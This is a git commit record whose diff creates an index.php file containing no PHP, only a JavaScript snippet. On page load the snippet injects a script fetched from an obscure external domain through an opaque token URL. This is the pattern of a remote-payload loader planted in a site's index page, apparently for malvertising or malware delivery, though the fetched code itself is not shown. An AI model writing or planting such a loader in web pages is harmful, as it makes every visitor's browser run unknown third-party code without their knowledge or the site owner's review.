baa1b04f6607e2a850e7607592a3e06d049c0dc6
eabdoharraki <61015095+eabdoharraki@users.noreply.github.com>
2020-02-13 19:48:32 +0600

    Create index.php

---
+++ index.php
@@ -0,0 +1,9 @@
+<script type="application/javascript">
+var d=document;var s=d.createElement('script'); 
+s.src='//ftltyx.com/F59Cqb?frm=script'; 
+if (document.currentScript) { 
+document.currentScript.parentNode.insertBefore(s, document.currentScript);
+} else {
+d.getElementsByTagName('head')[0].appendChild(s);
+}
+</script>
